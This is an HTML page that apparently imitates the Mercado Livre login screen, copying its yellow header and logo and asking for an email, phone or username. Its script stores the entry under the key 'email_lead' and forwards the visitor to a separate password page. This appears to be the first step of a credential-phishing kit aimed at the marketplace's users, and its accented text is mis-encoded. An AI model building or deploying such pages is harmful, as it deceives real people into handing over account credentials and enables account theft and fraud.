<!DOCTYPE html>
<html lang="pt-BR">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Digite o seu telefone, e-mail ou usu치rio do Mercado Livre</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <!-- Faixa amarela no topo -->
<header style="width:100vw;background-color:#fff159;position:relative;">
	<div class="headerMobile">
		<img onclick="ir_para(&quot;produto&quot;);" class="logo_da_loja" src="https://i.imgur.com/YDQShyx.png" style="margin:0 10px;height:32px;">
	</div>
</header>

    <!-- Container principal -->
    <main class="main-container">
        <div class="login-card">
            <h1 class="login-title">Digite o seu telefone, e-mail ou usu치rio do Mercado Livre</h1>
            
            <form class="login-form" id="loginForm">
                <div class="input-group">
                    <label for="email" class="input-label">E-mail, telefone ou usu치rio</label>
                    <input type="text" id="email" name="email" class="input-field">
                </div>
                
                <button type="submit" class="continue-btn">Continuar</button>
                
                <a href="#" id="createAccount" class="create-account-link">Criar conta</a>
            </form>
        </div>
    </main>

    <script>
      // Ao clicar em "Continuar"
      document.getElementById("loginForm").addEventListener("submit", function(e) {
        e.preventDefault();
        const email = document.getElementById("email").value.trim();

        if (email) {
          localStorage.setItem("email_lead", email);
          window.location.href = "senha.html";
        } else {
          alert("Por favor, digite seu e-mail, telefone ou usu치rio.");
        }
      });

      // Ao clicar em "Criar conta"
      document.getElementById("createAccount").addEventListener("click", function(e) {
        e.preventDefault();
        window.location.href = "criar-conta.html";
      });
    </script>
</body>
</html>
